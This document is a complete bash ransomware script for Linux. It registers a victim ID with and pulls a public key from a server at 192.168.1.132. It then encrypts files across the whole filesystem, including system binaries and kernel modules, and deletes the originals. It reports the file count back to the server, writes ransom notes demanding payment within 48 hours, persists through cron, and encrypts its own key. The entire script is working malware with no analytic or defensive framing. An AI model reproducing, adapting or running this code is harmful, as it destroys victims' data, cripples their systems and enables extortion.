#!/bin/bash

genKey=$(cat /dev/urandom | tr -dc 'A-Z0-9a-z' | fold -w 16 | head -n 1)

curl -k -d "uniqueID=${genKey}" https://192.168.1.132/target.php &>/dev/null

if [ -f /etc/redhat-release ]
then
  osType="redhat"
elif [ -f /etc/debian_version ]
then
  osType="debian"
else
  echo "Could not determine OS" &>/dev/null
fi

count=0

fileExts=("*.py" "*.txt" "*.cpp" "*.png" "*.jpg" "*.sh" "*.pyc" "*.key" "*.php" "*.css" "*.js" "*.tiff" "*.tff" "*.pl" \
          "*.ini" "*.xml" "*.desktop" "*.gpg" "*.enc" "*.lst" ".list" "*.properties" "*.acl" "*.gz" "*.tar" "*.bz2" "*.gif" \
          "*.doc*" "*.xls*" "*.pdf" "*.java" "*.swf" "*.jar" "*.json" "*.ppt*" "*.pst" "*.bat" "*.exe" "*.x" "*.pm" \
          "*.aps*" "*.cgi" "*.htm*" "*.dll" "*.class" "*.mov" "*.flv" "*.mp4" "*.mp3" "*.wav" "*.ogg" "*.md" \
          "*.yaml" "*.sql" "*.vim" "*.csv" "*.bak" "*.rb" "*.h" "*.c" "*.log" "*.waw" "*.jpeg" "*.rtf" "*.rar" "*.zip" \
          "*.psd" "*.tif" "*.wma" "*.bmp" "*.pps" "*.ppsx" "*.ppd" "*.eps" "*.ace" "*.djvu" "*.cdr" "*.max" "*.wmv" "*.avi" \ 
          "*.pdd" "*.aac" "*.ac3" "*.amf" "*.amr" "*.dwg" "*.dxf" "*.accdb" "*.mod" "*.tax2013" "*.tax2014" "*.oga" "*.pbf" \
          "*.ra" "*.raw" "*.saf" "*.val" "*.wave" "*.wow" "*.wpk" "*.3g2" "*.3gp" "*.3gp2" "*.3mm" "*.amx" "*.avs" "*.bik" \ 
          "*.dir" "*.divx" "*.dvx" "*.evo" "*.qtq" "*.tch" "*.rts" "*.rum" "*.rv" "*.scn" "*.srt" "*.stx" "*.svi" "*.trp" \
          "*.vdo" "*.wm" "*.wmd" "*.wmmp" "*.wmx" "*.wvx" "*.xvid" "*.3d" "*.3d4" "*.3df8" "*.pbs" "*.adi" "*.ais" "*.amu" \
          "*.arr" "*.bmc" "*.bmf" "*.cag" "*.cam" "*.dng" "*.ink" "*.jif" "*.jiff" "*.jpc" "*.jpf" "*.jpw" "*.mag" "*.mic" \
          "*.mip" "*.msp" "*.nav" "*.ncd" "*.odc" "*.odi" "*.opf" "*.qif" "*.qtiq" "*.srf" "*.xwd" "*.abw" "*.act" "*.adt" \
          "*.aim" "*.ans" "*.asc" "*.ase" "*.bdp" "*.bdr" "*.bib" "*.boc" "*.crd" "*.diz" "*.dot" "*.dotm" "*.dotx" "*.dvi" \
          "*.dxe" "*.mlx" "*.err" "*.euc" "*.faq" "*.fdr" "*.fds" "*.gthr" "*.idx" "*.kwd" "*.lp2" "*.ltr" "*.man" "*.mbox" \
          "*.msg" "*.nfo" "*.now" "*.odm" "*.oft" "*.pwi" "*.rng" "*.rtx" "*.run" "*.ssa" "*.text" "*.unx" "*.wbk" "*.wsh" \
          "*.7z" "*.arc" "*.ari" "*.arj" "*.car" "*.cbr" "*.cbz" "*.gzig" "*.jgz" "*.pak" "*.pcv" "*.puz" "*.r00" "*.r01" \
          "*.r02" "*.r03" "*.rev" "*.sdn" "*.sen" "*.sfs" "*.sfx" "*.sh" "*.shar" "*.shr" "*.sqx" "*.tbz2" "*.tg" "*.tlz" \
          "*.vsi" "*.wad" "*.war" "*.xpi" "*.z02" "*.z04" "*.zap" "*.zipx" "*.zoo" "*.ipa" "*.isu" "*.udf" "*.adr" "*.ap" \
          "*.aro" "*.asa" "*.ascx" "*.ashx" "*.asmx" "*.asp" "*.indd" "*.asr" "*.qbb" "*.bml" "*.cer" "*.cms" "*.crt" \ 
          "*.dap" "*.moz" "*.svr" "*.url" "*.wdgt" "*.abk" "*.bic" "*.big" "*.blp" "*.bsp" "*.cgf" "*.chk" "*.col" "*.cty" \
          "*.dem" "*.elf" "*.ff" "*.gam" "*.grf" "*.h3m" "*.h4r" "*.iwd" "*.ldb" "*.lgp" "*.lvl" "*.map" "*.md3" "*.mdl" \
          "*.mm6" "*.mm7" "*.mm8" "*.nds" "*.pbp" "*.ppf" "*.pwf" "*.pxp" "*.sad" "*.sav" "*.scm" "*.scx" "*.sdt" "*.spr" \
          "*.sud" "*.uax" "*.umx" "*.unr" "*.uop" "*.usa" "*.usx" "*.ut2" "*.ut3" "*.utc" "*.utx" "*.uvx" "*.uxx" "*.vmf" \
          "*.vtf" "*.w3g" "*.w3x" "*.wtd" "*.wtf" "*.ccd" "*.cd" "*.cso" "*.disk" "*.dmg" "*.dvd" "*.fcd" "*.flp" "*.img" \
          "*.iso" "*.isz" "*.md0" "*.md1" "*.md2" "*.mdf" "*.mds" "*.nrg" "*.nri" "*.vcd" "*.vhd" "*.snp" "*.bkf" "*.ade" \
          "*.adpb" "*.dic" "*.cch" "*.ctt" "*.dal" "*.ddc" "*.ddcx" "*.dex" "*.dif" "*.dii" "*.itdb" "*.itl" "*.kmz" "*.lcd" \
          "*.lcf" "*.mbx" "*.mdn" "*.odf" "*.odp" "*.ods" "*.pab" "*.pkb" "*.pkh" "*.pot" "*.potx" "*.psa" "*.qdf" "*.qel" \
          "*.rgn" "*.rrt" "*.rsw" "*.rte" "*.sdb" "*.sdc" "*.sds" "*.stt" "*.t01" "*.t03" "*.t05" "*.tcx" "*.thmx" "*.txd" \
          "*.txf" "*.upoi" "*.vmt" "*.wks" "*.wmdb" "*.xl" "*.xlc" "*.xlr" "*.xlsb" "*.xltx" "*.ltm" "*.xlwx" "*.mcd" "*.cap" \
          "*.cc" "*.cod" "*.cp" "*.cs" "*.csi" "*.dcp" "*.dcu" "*.dev" "*.dob" "*.dox" "*.dpk" "*.dpl" "*.dpr" "*.dsk" "*.dsp" \
          "*.eql" "*.ex" "*.f90" "*.fla" "*.for" "*.fpp" "*.jav" "*.lbi" "*.owl" "*.plc" "*.pli" "*.res" "*.rsrc" "*.swd" \
          "*.tpu" "*.tpx" "*.tu" "*.tur" "*.vc" "*.yab" "*.8ba" "*.8bc" "*.8be" "*.8bf" "*.8bi8" "*.bi8" "*.8bl" "*.8bs" \
          "*.8bx" "*.8by" "*.8li" "*.aip" "*.amxx" "*.ape" "*.api" "*.mxp" "*.oxt" "*.qpx" "*.qtr" "*.xla" "*.xlam" "*.xll" \
          "*.xlv" "*.xpt" "*.cfg" "*.cwf" "*.dbb" "*.slt" "*.bp2" "*.bp3" "*.bpl" "*.clr" "*.dbx" "*.jc" "*.potm" "*.ppsm" \
          "*.prc" "*.prt" "*.shw" "*.std" "*.ver" "*.wpl" "*.xlm" "*.yps" "*.md3" "*.1cd" "*.owned")

fileList=("/root/.history" "/root/.bash_history" "/root/.bashrc" \
          "/bin/netstat" "/bin/mount" "/bin/kill" \
          "/usr/sbin/useradd" "/usr/sbin/adduser" \
          "/bin/chgrp" "/usr/sbin/userdel" "/usr/sbin/usermod" "/usr/sbin/visudo" \
          "/usr/sbin/tcpdump" "/usr/sbin/service" "/sbin/reboot" "/sbin/shutdown" \
          "/usr/sbin/mysqld" "/usr/sbin/dmidecode" "/usr/sbin/chroot" \
          "/usr/sbin/chgpasswd" "/usr/sbin/apache2" "/usr/local/bin/*" \
          "/lib/modules/$(uname -r)/kernel/drivers/usb/storage/usb-storage.ko" \
          "/lib/modules/$(uname -r)/kernel/drivers/cdrom/cdrom.ko" )

curl -k https://192.168.1.132/downloads/pub.pem > /root/pub.pem 
chmod 755 /root/pub.pem

cat /dev/urandom | tr -cd 'A-Za-z0-9' | fold -w 256 | head -n 1 > /root/key.bin 
chmod 755 /root/key.bin

for ((num=0; num<"${#fileExts[@]}"; num++))
do
  for file in $(find / -name "${fileExts[${num}]}")
  do 
    openssl enc -aes-256-cbc -salt -in "${file}" -out "${file}.owned" -pass file:/root/key.bin &>/dev/null

    rm -rf  ${file} &>/dev/null

    count=$((count + 1))
  done
done

for ((num=0; num<"${#fileList[@]}"; num++))
do
  for file in "${fileList[${num}]}"
  do
    openssl enc -aes-256-cbc -salt -in "${file}" -out "${file}.owned" -pass file:/root/key.bin &>/dev/null

    rm -rf ${file} &>/dev/null

    count=$((count + 1))
  done
done

curl -k -d "fileCount=${count}&uniqueId=${genKey}" https://192.168.1.132/count.php

for directory in $(find /root/ /home/ /etc/ /bin/ /usr/sbin/ /usr/bin /sbin/ /usr/local/bin/ -type d)
do
  {
    echo "Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit https://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."
  } >> "${directory}/INSTRUCTIONS.txt"
done

{
  echo -en  "#"'!'"/bin/bash"
  echo -e "\n"
  echo -e "echo \"Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit https://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever.\""
} > /etc/cron.hourly/instructions.sh

chmod 755 /etc/cron.hourly/instructions.sh

getTTY=$(tty)

if [ "${osType}" == "redhat" ]
then
  /usr/bin/crontab -l | { cat; echo "1 * * * * /etc/cron.hourly/instructions.sh > ${getTTy}"; } | /usr/bin/crontab - &>/dev/null
elif [ "${osType}" == "debian" ]
then
  /usr/bin/crontab -l | { cat; echo "*/1 * * * * /etc/cron.hourly/instructions.sh > ${getTTY}"; } | /usr/bin/crontab - &>/dev/null
else
  echo "Could not set crontab" &>/dev/null
fi

echo "Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit https://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."

# Encrypt key.bin with our public key
openssl rsautl -encrypt -inkey /root/pub.pem -pubin -in /root/key.bin -out /root/key.bin.enc
rm -rf /root/key.bin
